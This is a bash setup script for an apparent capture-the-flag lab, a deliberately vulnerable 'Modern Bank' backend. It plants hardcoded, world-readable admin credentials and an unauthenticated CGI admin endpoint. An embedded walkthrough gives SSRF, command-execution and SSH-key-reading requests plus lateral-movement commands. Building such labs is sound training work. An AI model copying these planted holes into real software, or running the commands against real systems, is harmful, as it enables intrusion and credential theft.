#!/bin/bash
##############################################################################
# Modern Bank - Backend Setup Script (Ubuntu Server 24)
# Usage: sudo ./setup_backend.sh <FRONTEND_IP> <WINDOWS_DB_IP>
#
# This script:
# - Installs Node.js and required dependencies
# - Sets up the Express API backend
# - Configures vulnerable CGI endpoints
# - Opens internal firewall ports
# - Exposes system credentials
##############################################################################

set -e

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Arguments
FRONTEND_IP="${1:-192.168.1.10}"
WINDOWS_DB_IP="${2:-192.168.1.50}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
API_DIR="/opt/modernbank-backend"
LOG_FILE="/var/log/modern_bank_backend_setup.log"

# Log functions
log() {
    echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1" | tee -a "$LOG_FILE"
    exit 1
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1" | tee -a "$LOG_FILE"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    error "This script must be run as root (use sudo)"
fi

log "Starting Modern Bank Backend Setup..."
log "Frontend IP: $FRONTEND_IP"
log "Windows DB IP: $WINDOWS_DB_IP"

# ============================================================================
# 1. Update system
# ============================================================================
log "Updating system packages..."
apt-get update -qq
apt-get upgrade -y -qq

# ============================================================================
# 2. Install Node.js and npm
# ============================================================================
log "Installing Node.js and npm..."
apt-get install -y -qq \
    curl \
    wget \
    git \
    build-essential \
    python3

# Install Node.js from NodeSource repository (latest LTS)
if ! command -v node &> /dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - 2>/dev/null || true
    apt-get install -y -qq nodejs
fi

log "Node.js version: $(node --version)"
log "NPM version: $(npm --version)"

# ============================================================================
# 3. Create application directory and deploy files
# ============================================================================
log "Deploying backend application..."
mkdir -p "$API_DIR"
cd "$API_DIR"

# Copy application files
cp "$SCRIPT_DIR/api"/* "$API_DIR/" 2>/dev/null || true

# ============================================================================
# 4. Create and configure .env file
# ============================================================================
log "Configuring environment variables..."
cat > "$API_DIR/.env" << EOF
# Modern Bank Backend Configuration
NODE_ENV=production
PORT=8080

# Frontend connectivity
FRONTEND_IP=$FRONTEND_IP

# Windows Database VM credentials (INTENTIONALLY EXPOSED)
WINDOWS_HOST=$WINDOWS_DB_IP
WINDOWS_USER=Administrator
WINDOWS_PASS=ModernBank@2024!Admin
WINDOWS_DB=ModernBank

# Database configuration
DB_TYPE=MSSQL
DB_HOST=$WINDOWS_DB_IP
DB_PORT=1433
DB_USER=sa
DB_PASS=ModernBank@2024!Admin
DB_NAME=ModernBank

# Authentication
API_KEY=super_secret_api_key_12345
JWT_SECRET=jwt_secret_key_change_me

# SSH to Windows (for lateral movement)
SSH_HOST=$WINDOWS_DB_IP
SSH_USER=Administrator
SSH_PASS=ModernBank@2024!Admin
SSH_PORT=22

# Logging
LOG_LEVEL=debug
DEBUG=true
EOF

chmod 644 "$API_DIR/.env"
success "Configuration created (.env file vulnerable and readable)"

# ============================================================================
# 5. Install Node.js dependencies
# ============================================================================
log "Installing Node.js dependencies..."
cd "$API_DIR"
npm install --no-save 2>&1 | tail -5

# ============================================================================
# 6. Create systemd service for backend
# ============================================================================
log "Creating systemd service..."
cat > /etc/systemd/system/modernbank-backend.service << EOF
[Unit]
Description=Modern Bank Backend API
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$API_DIR
ExecStart=/usr/bin/node $API_DIR/server.js
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable modernbank-backend.service

# ============================================================================
# 7. Start the backend service
# ============================================================================
log "Starting backend service..."
systemctl start modernbank-backend.service
sleep 2

# Verify service is running
if systemctl is-active --quiet modernbank-backend.service; then
    success "Backend service started successfully"
else
    error "Failed to start backend service"
fi

# ============================================================================
# 8. Install PHP for CGI admin endpoint (optional)
# ============================================================================
log "Installing PHP (for CGI admin endpoint)..."
apt-get install -y -qq php-cli php-cgi php-curl

# Create CGI configuration
mkdir -p /usr/lib/cgi-bin
cp "$API_DIR/admin_cgi.php" /usr/lib/cgi-bin/admin.php 2>/dev/null || true
chmod 755 /usr/lib/cgi-bin/admin.php

# ============================================================================
# 9. Create test credentials file (for CTF)
# ============================================================================
log "Creating exposed credentials file..."
cat > "/tmp/backend_credentials.txt" << EOF
=== Modern Bank Backend - Credentials ===
Discovered: $(date)

Windows Database VM Access:
- Host: $WINDOWS_DB_IP
- Username: Administrator
- Password: ModernBank@2024!Admin
- Database: ModernBank
- Port: 1433 (MSSQL), 22 (SSH)

Backend API:
- URL: http://localhost:8080
- API Key: super_secret_api_key_12345
- Admin Endpoint: http://localhost:8080/cgi-bin/admin.php

Vulnerable Endpoints:
- GET /api/config - Exposes all configuration
- GET /api/logs - Lists all requests
- POST /api/proxy - SSRF vulnerability
- GET /cgi-bin/admin.php?action=exec&cmd=id - RCE
- GET /cgi-bin/admin.php?action=file&file=/etc/passwd - Arbitrary file read

SSH Access (from this machine):
ssh Administrator@$WINDOWS_DB_IP
Password: ModernBank@2024!Admin

Database Access (MSSQL):
sqlcmd -S $WINDOWS_DB_IP -U Administrator -P "ModernBank@2024!Admin" -d ModernBank
EOF

cat > "$API_DIR/BACKEND_CREDENTIALS.txt" << EOF
=== Modern Bank Backend - Credentials ===
Discovered: $(date)

Windows Database VM:
- Host: $WINDOWS_DB_IP
- Username: Administrator
- Password: ModernBank@2024!Admin

Database:
- Type: MSSQL
- Port: 1433
- Name: ModernBank
- User: sa
- Password: ModernBank@2024!Admin

SSH Connection:
ssh -u Administrator $WINDOWS_DB_IP

API Endpoints:
- /api/config - Configuration dump (credentials exposed)
- /api/logs - Request logging
- /api/proxy - SSRF vulnerability
- /cgi-bin/admin.php - Unauthenticated admin interface
EOF

chmod 644 "$API_DIR/BACKEND_CREDENTIALS.txt"

# ============================================================================
# 10. Configure firewall rules
# ============================================================================
log "Configuring firewall..."
ufw allow 22/tcp 2>/dev/null || true
ufw allow 8080/tcp 2>/dev/null || true
ufw allow from "$FRONTEND_IP" to any port 8080 2>/dev/null || true
ufw --force enable 2>/dev/null || true

# ============================================================================
# 11. Create CTF documentation
# ============================================================================
log "Creating CTF documentation..."
cat > "$API_DIR/CTF_BACKEND.md" << 'EOF'
# Modern Bank Backend - CTF Challenge

## Vulnerabilities

### 1. SSRF via /api/proxy Endpoint
**Location:** POST /api/proxy
**Vulnerability:** Server-Side Request Forgery
**Attack:**
```bash
curl -X POST http://localhost:8080/api/proxy \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///etc/passwd"}'

# Or access internal Windows service
curl -X POST http://localhost:8080/api/proxy \
  -H "Content-Type: application/json" \
  -d '{"url": "http://192.168.1.50:1433"}'
```

### 2. Unauthenticated Admin Endpoint
**Location:** GET /cgi-bin/admin.php
**Commands:**
- `action=info` - System information and credentials
- `action=exec&cmd=whoami` - Command execution
- `action=files&path=/etc` - Directory listing / file enumeration
- `action=db` - Database credentials
- `action=ssh_keys` - SSH keys listing

**Example Attack:**
```bash
curl "http://localhost:8080/cgi-bin/admin.php?action=exec&cmd=id"
curl "http://localhost:8080/cgi-bin/admin.php?action=file&file=/root/.ssh/id_rsa"
curl "http://localhost:8080/cgi-bin/admin.php?action=info"
```

### 3. Configuration Exposure
**Location:** GET /api/config
**Content:** All internal credentials, Windows DB access details exposed

```bash
curl http://localhost:8080/api/config
```

### 4. Exposed Environment Files
**Locations:**
- `.env` - All configuration (readable)
- `BACKEND_CREDENTIALS.txt` - Windows credentials
- `/tmp/backend_credentials.txt` - Backup credentials

### 5. Exposed Logs
**Location:** GET /api/logs
**Content:** All API requests logged (may contain sensitive info)

```bash
curl http://localhost:8080/api/logs
```

## Attack Path to Windows Database VM

### Step 1: Discover Credentials
```bash
# From Frontend shell, access this service
curl http://localhost:8080/api/config
# Or read .env file
cat .env
# Or read exposed credentials file
cat BACKEND_CREDENTIALS.txt
```

### Step 2: Extract Windows Credentials
```
Host: 192.168.1.50
Username: Administrator
Password: ModernBank@2024!Admin
```

### Step 3: Access Windows Database VM
```bash
# Via SSH (if OpenSSH installed)
ssh Administrator@192.168.1.50

# Via MSSQL
sqlcmd -S 192.168.1.50 -U Administrator -P "ModernBank@2024!Admin" -d ModernBank

# Via SMB
smbclient -U Administrator //192.168.1.50/C$ -c "ls"
```

### Step 4: Lateral Movement
Once on Windows DB VM:
- Access MSSQL database
- Dump banking data
- Escalate privileges
- Access internal admin services

## Laboratory Environment

```
Tier 1: Frontend (Ubuntu LTS)
  └─ File Upload → PHP Web Shell
     └─ Read exposed credentials
        └─ SSH to Backend

Tier 2: Backend (Ubuntu Server 24) ← YOU ARE HERE
  └─ SSRF / Unauthenticated endpoints
     └─ Extract Windows credentials
        └─ Access Tier 3 (Database VM)

Tier 3: Database VM (Windows 10)
  └─ MSSQL Database
     └─ Admin Services
        └─ Complete compromise
```

## Relevant Files in This Tier

- `server.js` - Main Express API (all vulnerabilities)
- `admin_cgi.php` - CGI admin endpoint
- `.env` - Exposed environment file
- `credentials.txt` - Mock SSH key + credentials
- `BACKEND_CREDENTIALS.txt` - Windows DB credentials
- `package.json` - Node.js dependencies

## Success Indicators

- ✓ Access /api/config and retrieve Windows credentials
- ✓ Discover and exploit SSRF vulnerability
- ✓ Execute commands via admin endpoint
- ✓ Extract Windows database credentials
- ✓ Establish SSH/RDP connection to Windows VM
EOF

# ============================================================================
# 12. Print summary
# ============================================================================
echo ""
echo -e "${YELLOW}========================================${NC}"
echo -e "${GREEN}Backend Setup Complete!${NC}"
echo -e "${YELLOW}========================================${NC}"
echo ""
echo -e "Application URL: ${BLUE}http://localhost:8080${NC}"
echo -e "Frontend IP: ${BLUE}$FRONTEND_IP${NC}"
echo -e "Windows DB IP: ${BLUE}$WINDOWS_DB_IP${NC}"
echo -e "Application Dir: ${BLUE}$API_DIR${NC}"
echo -e "Log File: ${BLUE}$LOG_FILE${NC}"
echo ""
echo -e "${YELLOW}Service Status:${NC}"
systemctl status modernbank-backend.service --no-pager | head -5
echo ""
echo -e "${YELLOW}Vulnerable Endpoints:${NC}"
echo -e "  ✓ GET  /api/config              - Configuration dump"
echo -e "  ✓ POST /api/proxy               - SSRF vulnerability"
echo -e "  ✓ GET  /cgi-bin/admin.php       - Unauthenticated RCE"
echo -e "  ✓ GET  /api/logs                - Request logging"
echo -e "  ✓ POST /api/callback            - Callback RCE"
echo ""
echo -e "${YELLOW}Exposed Credentials:${NC}"
echo -e "  • .env file (readable)"
echo -e "  • BACKEND_CREDENTIALS.txt"
echo -e "  • /tmp/backend_credentials.txt"
echo ""
echo -e "${YELLOW}Windows Database VM Access:${NC}"
echo -e "  Host: ${BLUE}$WINDOWS_DB_IP${NC}"
echo -e "  User: ${BLUE}Administrator${NC}"
echo -e "  Pass: ${BLUE}ModernBank@2024!Admin${NC}"
echo ""
echo -e "${YELLOW}Quick Test (from Frontend):${NC}"
echo -e "  ${BLUE}curl http://localhost:8080/api/config${NC}"
echo -e "  ${BLUE}curl http://localhost:8080/cgi-bin/admin.php?action=info${NC}"
echo ""
success "Backend tier is ready for exploitation!"
